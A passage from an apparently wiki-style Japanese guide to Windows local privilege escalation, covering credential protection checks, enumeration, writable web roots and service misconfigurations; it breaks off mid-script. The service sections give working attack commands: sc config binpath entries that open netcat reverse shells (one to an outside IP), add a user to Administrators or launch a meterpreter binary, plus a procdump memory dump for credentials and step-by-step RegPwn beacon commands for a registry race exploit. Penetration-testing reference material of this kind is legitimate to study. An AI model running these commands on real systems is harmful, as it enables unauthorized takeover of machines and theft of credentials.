**LAPS** は、ドメインに参加しているコンピューターの**ローカル Administrator パスワードを管理**し、各パスワードが**一意でランダムに生成され、定期的に更新される**ように設計されています。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、許可されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページで WDigest の詳細を確認できます**](../stealing-credentials/credentials-protections.md#wdigest)。

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** から、Microsoft は Local Security Authority (LSA) の保護を強化し、信頼されていないプロセスによるメモリの**読み取り**やコードのインジェクションを**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash 攻撃などの脅威からデバイスに保存された認証情報を保護することです。[**Credential Guard の詳細はこちらをご覧ください。**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### キャッシュされた資格情報

**ドメイン資格情報**は**ローカル セキュリティ機関**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって使用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**キャッシュされた資格情報についての詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループの中に、興味深い権限を持つものがないか確認してください。

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### 特権グループ

**特権グループに所属している場合、権限昇格できる可能性があります**。特権グループと、権限昇格のためにそれらを悪用する方法については、こちらを確認してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### トークン操作

このページで**トークン**とは何かを**詳しく確認**してください: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深いトークン**とそれらを悪用する方法を確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッションಗಳು

```bash
qwinsta
klist sessions
```

### ホームフォルダー

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### パスワードポリシー

```bash
net accounts
```

### クリップボードの内容を取得する

```bash
powershell -command "Get-Clipboard"
```

## 実行中のプロセス

### ファイルとフォルダーのアクセス許可

まず、プロセスのコマンドラインに**パスワードが含まれていないか確認します**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーへの書き込み権限があるかを確認し、[**DLL Hijacking attacks**](dll-hijacking/index.html)を仕掛けられるか調べます。

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

常に実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。これを悪用して権限昇格できる場合があります。

debugger listenerは短時間で停止することがあるため、受動的なポートスナップショットで見つからなくても、公開されていなかったとは限りません。検出したlistenerについて、PID、プロセスの所有者、権限の低いユーザーから到達可能かどうかを照合してください。アプリケーション名やdebug flagだけでは、ユーザーをまたいだコード実行が可能だとは判断できません。通常の列挙は受動的に行い、debuggerコマンドは送信しないでください。

**プロセスのバイナリの権限を確認する**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**プロセスのバイナリがあるフォルダーのアクセス許可を確認する (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessorディレクトリ

Snort 2は、`snort.exe -c <config>`で選択した設定ファイルに宣言された`dynamicpreprocessor directory`から共有ライブラリを読み込めます。別のアカウントでSnortを実行するスケジュールタスクまたはサービスがある場合は、そのタスクやサービスが実際に使う設定ファイルと、宣言されたモジュールディレクトリのACLを確認してください。自分のトークンでそのディレクトリにファイルを作成できる場合、次にタスクまたはサービスがモジュールを読み込む際のcode executionにつながる可能性があるため、調査対象になります。実行アカウントの実効権限、アクティブな設定、モジュールの互換性、拒否設定や共有制限を確認してください。ディレクトリに書き込めるだけでは、権限昇格が成立するとは限りません。[Snortのdynamic-preprocessorに関するドキュメント](https://www.snort.org/documents/dpx-readme)では、実行時のモジュール読み込みについて説明されています。

### 書き込み可能なドキュメントルートを持つ特権Webサービス

WindowsのApache環境では、サービスの実行ファイルのパスと実行アカウントを、アクティブな`httpd.conf`にある`DocumentRoot`と照合してください。一般的なXAMPPの構成では、`C:\xampp\apache\conf\httpd.conf`と、設定されているドキュメントルート（多くの場合`C:\xampp\htdocs`）のACLを確認します。Apacheが`LocalSystem`として実行されている間に、権限の低いユーザーがそのルートにファイルを作成できる場合、サーバー側のcode executionによってホストの権限境界を越えられる可能性があります。サービスが実行中であること、対象の正確なパスが実際に公開されていること、対象のファイルタイプをサーバー側のハンドラーが処理することを確認してください。ルートに書き込めるだけでは、ファイルを作成できることしか証明できません。プローブを書き込まずにACLを確認します：

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

一般的な WAMP インストールでは、サービスがバージョン付きの `C:\wamp64\bin\apache\apache*\bin\httpd.exe`（32-bit 構成では `C:\wamp\...`）を指し、設定ファイルはその隣の `conf\httpd.conf` にあり、既定のルートは `C:\wamp64\www` または `C:\wamp\www` です。正確なサービスイメージ、実行ユーザー、実効 `DocumentRoot`（`${INSTALL_DIR}` の展開や仮想ホストによる上書きを含む）、ルートの ACL をまとめて確認してください。WAMP ディレクトリに書き込み可能でも、Apache が `SYSTEM` として実行されることや、アップロードしたファイルが実行されることの証明にはなりません。[Apache のドキュメントでは、Windows サービスが設定を選択する方法が説明されています](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service)。

### 書き込み可能な IIS ルートとアプリケーションプールのネットワーク ID

IIS では、`applicationHost.config` で書き込み可能な物理ディレクトリが**有効なサイトまたはアプリケーション**に割り当てられていることを確認し、設定されたプールとサーバー側ハンドラーを特定してください。配信ディレクトリに置いたコードがプールの ID で実行されるのは、IIS がそのファイル形式を処理し、そのルートにアクセスできる場合に限られます。書き込み可能なディレクトリをコード実行と見なす前に、現在のユーザーが実効的にファイルを作成できるか、サイトが稼働中か、ハンドラーとパスごとの上書き設定がどうなっているかを確認してください。

ASP.NET の動的コンパイルについては、アプリケーションのコンパイルディレクトリに生成されるファイルも別途確認してください。既定では、該当する .NET Framework のインストール先の下にある `Temporary ASP.NET Files` ディレクトリですが、アプリケーションの `<compilation tempDirectory>` で変更できます。[Microsoft のドキュメントでは、場所とアプリケーションごとのサブディレクトリが説明されています](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29)。また、アプリケーションプール同士が互いを信頼しない場合は、コンパイルディレクトリを分離することが[推奨されています](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories)。低権限のトークンで**特定の**アプリケーションのキャッシュ内にある生成ソースを変更できる場合、そのアプリケーションがより高い権限の[ワーカープロセス ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)で再コンパイルするかを確認してください。ファイルまたはディレクトリの ACL だけではコード実行の証明になりません。キャッシュが有効なアプリケーションに属するか、実効トークンと ACL、コンパイル設定、プロセス ID、再コンパイルのタイミングを照合してください。読み取り専用でメタデータを確認し、列挙中にコンパイルを発生させたりキャッシュファイルを変更したりしないでください。

`ApplicationPoolIdentity` または `NetworkService` に設定された IIS プールは、ローカルのトークンが低権限でも、通常はドメインリソースへの認証に**ホストコンピューターアカウント**を使用します。`LocalSystem` はローカルですでに高い権限を持ち、ネットワーク上でもコンピューターアカウントを使用します。一方、`LocalService` は通常、匿名のネットワーク資格情報を提示します。`SpecificUser` のプールは、設定されたアカウントを使用します。[Microsoft のドキュメントでは、これらの ID タイプ](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel)と[アプリケーションプールのネットワーク ID](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)が説明されています。ID 設定が省略されている場合は、プールの既定値を引き継ぐことがあります。既定値は IIS の世代によって異なるため、プール名から推測せず、実効設定を確認してください。コード実行先のプールがコンピューターアカウントのネットワーク ID を持つ場合は、**そのコンピューター固有の**ディレクトリ権限を評価してください。[DCSync](../active-directory-methodology/dcsync.md) には、ドメインの命名コンテキストに対するレプリケーション権限が必要です。マシンアカウントのチケットやホストの役割だけでは、その権限があることの証明になりません。受動的な列挙では、ファイルをアップロードしたり、ネットワーク認証を行ったり、チケットを要求したりせずに、設定と ACL を確認してください。

ヘルパープロセスを起動する ASP.NET ハンドラーを読み取れる場合は、リクエスト由来の値が認証、復号、検証、コマンド構築をどのように経由するかを追跡してください。デコードされたトークンを `ProcessStartInfo("cmd", "/c ...")` に連結するハンドラーでは、シェルのメタ文字によってコマンドが変わる可能性があります。[Microsoft のドキュメントでは、`cmd` の特殊文字が説明されています](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd)。信頼できない呼び出し元が実際にデコード後の値を制御でき、ハンドラーに到達できることを確認したうえで、実効アプリケーションプール ID または偽装された ID と、子プロセスの ID を特定してください。ソースコードの一行、localhost のリスナー、トークン形式の弱点だけでは、特権コマンド実行の証明になりません。受動的な列挙では、偽造したリクエストを送信したりヘルパーを実行したりせずに、ソースとプール設定を確認してください。

Windows 上の PHP サービスでは、リクエストで制御されるパスが[`include` または `require`](https://www.php.net/manual/en/function.include.php)に渡されると、ワーカープロセスの ID で低権限ユーザーが書き込み可能な PHP ファイルを評価する可能性があります。リクエストからその処理に到達できること、解決後のパスが低権限ユーザーに変更可能でワーカーが読み取れるファイルを指していること、適用される PHP のパス制限でインクルードが許可されていること、ワーカーが実際により高い権限で動作していることを確認してください。ループバックリスナーや書き込み可能なファイルだけでは、この一連の条件が成立する証明になりません。受動的な列挙では、エンドポイントを呼び出さずにソース、サービス ID、ファイル ACL を確認してください。

### メモリからのパスワード採取

sysinternals の **procdump** を使うと、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、**メモリ内に平文の認証情報を保持している**ことがあります。メモリをダンプして認証情報を確認してみてください。

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### 安全でない GUI アプリ

**SYSTEM として実行されるアプリケーションでは、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows Help and Support」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

### 特権アカウントによるプロジェクトファイルのインポート

低権限ユーザーが書き込み可能なドロップディレクトリからプロジェクトを自動的に開くアプリケーションは、インポーターのアカウントで入力の信頼境界を越えます。**実際の書き込み可能なパス**、それを開くプロセスまたはタスク、その実効 ID、パーサーのビルドを確認してください。[過去の Ghidra のプロジェクトを開く／復元する際の問題](https://github.com/NationalSecurityAgency/ghidra/issues/71)では、プロジェクトのメタデータに XML external entity を含めることができました。Windows 上でネットワーク上の entity が、[アウトバウンド SMB と NTLM のポリシー](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking)によって許可されていれば、インポートするアカウントから認証が発生する可能性があります。これは認証情報漏えいにつながる手掛かりであり、直ちに管理者アクセスが得られることを意味するものではありません。応答を利用するには、別途、認可された経路または脆弱な経路が必要であり、現行ビルドは実際のパッチ適用状況に基づいて評価してください。受動的な列挙中に細工したプロジェクトを開かず、インポートのワークフローと ACL を調べてください。

## サービス

Service Control Manager（SCM）オブジェクトの [`SC_MANAGER_CREATE_SERVICE` 権限](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)は、既存のサービスに対する権限とは別のものです。この権限を指定した読み取り専用の [`OpenSCManager` アクセス要求](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw)が成功しても、確認すべき手掛かりに過ぎず、新しいサービスを実行できる証明にはなりません。[`CreateService` はハンドルを返します](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew)。そのハンドルには作成時に要求されたサービスアクセス権が付与されます。後でサービスを再度開くと別途アクセスチェックが行われ、元のハンドルを使用できる場合でも失敗することがあります。実効的なローカルまたはリモートのトークン、付与されたハンドル権限、サービスアカウント、起動ポリシー、実行ファイルのパスをそれぞれ確認してください。受動的な列挙中にサービスを作成または起動しないでください。

リモートからサービスをインストールする経路については、対象上の共有に対する SCM 権限と、**同じネットワークログオン**での書き込み可否、その共有の基盤となる NTFS ACL、サービスアカウントが実行できるローカルの実行ファイルパスを照合してください。SCM 権限が異常に広く、ファイルを配置できる経路もある場合、非管理者アカウントでもこの境界を越えられることがあります。管理共有は必須ではありません。共有への書き込み権限だけ、またはサービス作成権限があるという手掛かりだけでは、新しいサービスがより高い権限で起動できるとは判断できません。

既存のサービスは、`ImagePath` に記載されていないヘルパー実行ファイルでも、起動、シャットダウン、その他のライフサイクルイベント時に呼び出すことがあります。ヘルパー名が低権限ユーザーの書き込み可能なディレクトリから解決され、サービスがより高い権限で動作する場合、存在しないヘルパーファイルは条件付きで置き換え候補になります。**実際のサービスコードまたは文書化されたヘルパーの呼び出し**、解決される実行ファイルのパスと検索順、ディレクトリの作成権限、サービス ID、利用可能なライフサイクルトリガーを確認してください。サービスディレクトリが書き込み可能であることやファイルが存在しないことだけでは、サービスがそのファイルを読み込むとは限りません。受動的な調査ではサービスを起動または停止しないでください。

既存のサービスでは、[`SERVICE_START` により `StartService` に引数を渡せます](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew)。これは [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) とは別の権限です。起動権限を単なる制御権以上のものとして扱う前に、サービスのコードまたは文書化されたインターフェースを確認してください。呼び出し元が選択した引数をログまたはエクスポート先のパスとして使用する場合は、サービス ID、引数から書き込みに至る実際の処理、パス制限、**作成されるファイル**の権限を確認してください。保護されたディレクトリへの書き込みが権限昇格につながるのは、そのファイルを受け入れる別の特権コンシューマーまたはローダーがある場合に限られます。書き込み可能なログや起動権限だけでは不十分です。受動的なインベントリ調査では、サービスを起動したりテストファイルを作成したりしないでください。

NSClient++ monitoring agent では、読み取り可能な `nsclient.ini` は**設定を調査する手掛かり**です。Web の認証情報が含まれている可能性があり、`boot.ini` によって設定ファイルの場所が別の場所に変更されている場合もあります。実際のサービスアカウント、WEB リスナーとアクセス制御ポリシー、認証済みのロールで設定またはスクリプトを変更できるかを確認してください。特権実行にはさらに、`CheckExternalScripts`（または有効な別の実行経路）、コマンドの登録または変更を行う実効権限、それをサービス ID で実行するトリガーが必要です。ループバック限定のリスナーでもローカルユーザーから到達できる場合がありますが、ファイルパス、パスワード、リスナーのいずれかだけでは、そのような権限があるとは判断できません。受動的な列挙中は、秘密情報を表示したり Web API を呼び出したりせず、メタデータと権限を確認してください。[NSClient++ のファイル構成](https://nsclient.org/docs/concepts/file-layout/)、[Web とスクリプトのセキュリティに関するガイダンス](https://nsclient.org/docs/setup/securing/)、[外部スクリプトの設定](https://nsclient.org/docs/reference/check/CheckExternalScripts/)を参照してください。

`ImagePath` が `nssm.exe` のサービスでは、サービスの実際の実行アカウントと `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` の値を確認してください。[NSSM は子アプリケーションをそこに保存します](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h)。`AppDirectory` は設定された作業ディレクトリです。ラッパーの権限だけでサービスの境界全体を判断せず、子実行ファイルとその親ディレクトリの ACL を確認してください。その子が公開するローカル WCF または SOAP エンドポイントは、別途調査すべき手掛かりです。低権限ユーザーからリスナーに到達できるか、特定の操作がそのユーザーの入力を受け付けるか、サービスの子プロセスがより高い権限で安全でない操作を実行するかを確認してください。サービスアカウント、エンドポイント URL、書き込み可能なパスだけでは、権限昇格の証明になりません。受動的な列挙中はサービス操作を呼び出さないでください。

カスタム WCF 操作については、呼び出し元が制御する文字列が PowerShell runspace に渡される経路を追跡してください。[`Pipeline.Commands.AddScript` はスクリプトテキストを追加します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript)。[`Pipeline.Invoke` はパイプラインを実行します](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke)。[Windows transport credentials を使用する `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding)はクライアントを認証しますが、その**特定の**操作を呼び出す権限と runspace の実効 ID は別途確認する必要があります。低権限の呼び出し元の入力から、より高い権限のサービス ID で実行される `AddScript` への経路は、コード実行の境界となります。リスニングポート、認証済みクライアント、無関係なアセンブリ内の未使用メソッドだけでは証明になりません。列挙中にエンドポイントを呼び出さず、デプロイされたサービス、コントラクト、認可、偽装設定を静的に確認してください。

Service Triggers を使うと、特定の条件（名前付きパイプ／RPC エンドポイントのアクティビティ、ETW イベント、IP の利用可能状態、デバイスの接続、GPO の更新など）をきっかけに Windows がサービスを起動できます。SERVICE_START 権限がなくても、トリガーを発生させて特権サービスを起動できることがあります。列挙と起動の手法はこちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio diagnostic collector service

C/C++ tooling を含む Visual Studio のインストールには、`LocalSystem` として実行されるよう設定された診断サービス `VSStandardCollectorService150` が含まれる場合があります。[CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/)では、junction と object-manager-link の race を利用してサービスの DACL リセット先をリダイレクトしました。実証された権限昇格にはさらに、利用可能な Visual Studio Setup WMI Provider MSI の修復経路と、その対象である `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` が必要でした。このコンポーネントは 2024 年 1 月に修正されました。

受動的なトリアージでは、そのサービスのアカウントとバイナリパスを確認し、Setup WMI compiler のパスが存在するかを調べ、インストール済みコンポーネントのパッチ適用状況を確認してください。サービスのエントリ、Visual Studio の製品バージョン、コンパイラファイルのいずれかだけでは、ホストに脆弱性があるとは判断できません。確認のためにサービスを起動したり、修復を実行したりする必要はありません。

サービスの一覧を取得します。

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Permissions

**sc** を使用してサービスの情報を取得できます。

```bash
sc qc <service_name>
```

各サービスに必要な権限レベルを確認するため、_Sysinternals_ のバイナリ **accesschk** を用意しておくことを推奨します。

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

「Authenticated Users」が任意のサービスを変更できるか確認することを推奨します：

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

（たとえば SSDPSRV で）次のエラーが発生する場合：

_システム エラー 1058 が発生しました。_\
_サービスは無効になっているか、サービスに関連付けられた有効なデバイスがないため、開始できません。_

次のコマンドで有効にできます。

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**サービス upnphost が動作するには SSDPSRV に依存している点に注意してください（XP SP1 の場合）**

**この問題の別の回避策**は、次を実行することです。

```
sc.exe config usosvc start= auto
```

### **サービスバイナリパスを変更**

「Authenticated users」グループがサービスに対して**SERVICE_ALL_ACCESS**を持つ場合、サービスの実行可能バイナリを変更できます。**sc**を変更して実行するには：

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### サービスを再起動

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

権限は、次のようなさまざまなアクセス許可を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: サービスバイナリの再構成を許可します。
- **WRITE_DAC**: アクセス許可の再構成を可能にし、サービス構成を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得とアクセス許可の再構成を可能にします。
- **GENERIC_WRITE**: サービス構成を変更する権限も継承します。
- **GENERIC_ALL**: サービス構成を変更する権限も継承します。

この脆弱性の検出と悪用には、_exploit/windows/local/service_permissions_ を利用できます。

### サービスバイナリの脆弱なアクセス許可

サービスが **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つドメインアカウントとして実行されていて、**低権限ユーザーがサービス EXE またはその親フォルダーを変更できる**場合、**バイナリを置き換えてサービスを再起動する**ことで、サービスを乗っ取れることがよくあります。

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが配置されているフォルダーへの**書き込み権限があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**）。**\
**wmic**（system32 にはありません）を使用して、サービスによって実行されるすべてのバイナリを取得し、**icacls** を使用してアクセス許可を確認できます：

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

また、**sc** と **icacls** も使用できます:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探してください。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な悪用の流れは次のとおりです。<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な悪意あるサービスバイナリに置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または、再起動／サービスのトリガーを待ちます）。

便利な自動チェック：<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> サービスによって通常ユーザーからの再起動が許可されていない場合は、起動時に自動で開始するか、失敗時のアクションで再起動するか、またはそのサービスを使用するアプリケーションを通じて間接的に起動できるかを確認してください。

### サービスレジストリの変更権限

変更可能なサービスレジストリがあるか確認してください。\
サービスレジストリに対する**権限**は、次のように**確認**できます。

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

元の権限テストでは、次のように記述されていました。

**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持つかどうかを確認します。持っている場合、サービスによって実行されるバイナリを変更できます。

特定のサービスキーに対して、**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が書き込み可能なレジストリ権限を持っているか確認してください。ACLエントリがあるだけでは、実効アクセスが可能だとは限りません。拒否エントリ、現在のトークン、継承された権限も関係します。レジストリキーの権限は、サービスオブジェクトの `SERVICE_CHANGE_CONFIG` および `SERVICE_START` 権限とは別です。権限昇格にはさらに、利用可能なサービス設定項目、サービスを起動する手段、およびより高い権限を持つサービスIDが必要です。Microsoftの[レジストリキーの権限](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights)および[サービスのアクセス権リファレンス](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights)を参照してください。

実行されるバイナリのPathを変更するには：

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### レジストリ symlink race による任意の HKLM value write（ATConfig）

一部の Windows アクセシビリティ機能はユーザーごとの **ATConfig** キーを作成し、その後 **SYSTEM** プロセスがそれを HKLM のセッションキーにコピーします。レジストリの **symbolic link race** により、この特権的な書き込みを **任意の HKLM パス**にリダイレクトでき、任意の HKLM **value write** が可能になります。<sup>[[18]](#references)</sup>

主な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みのアクセシビリティ機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` はログオン時や secure-desktop への移行時に作成され、ユーザーが書き込み可能です。

悪用の流れ（CVE-2026-24291 / ATConfig）:

1. SYSTEM に書き込ませたい値を **HKCU ATConfig** に設定します。
2. secure-desktop へのコピーをトリガーします（例: **LockWorkstation**）。これにより AT broker のフローが開始されます。
3. **race に勝つ**ため、`C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定します。oplock が発動したら、**HKLM Session ATConfig** キーを保護された HKLM のターゲットを指す **registry link** に置き換えます。
4. SYSTEM が、攻撃者の指定した値をリダイレクト先の HKLM パスに書き込みます。

任意の HKLM value write ができたら、サービス設定値を上書きして LPE に **pivot** します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/コマンドライン）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常ユーザーが起動できるサービス（例: **`msiserver`**）を選び、書き込み後に起動します。**注:** 公開されている exploit の実装では、race の一環としてワークステーションをロックします。

ツールの例（RegPwn BOF / standalone）:<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### サービスレジストリの AppendData/AddSubdirectory 権限

レジストリに対するこの権限がある場合、**そのレジストリの下にサブレジストリを作成できます**。Windows サービスの場合、**任意のコードを実行するにはこれで十分です**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行ファイルへのパスが引用符で囲まれていない場合、Windows は空白までの各部分を末尾とするパスを実行しようとします。

たとえば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windows は次のファイルを実行しようとします:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

組み込み Windows サービスに属するものを除き、引用符で囲まれていないすべてのサービスパスを列挙します：

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
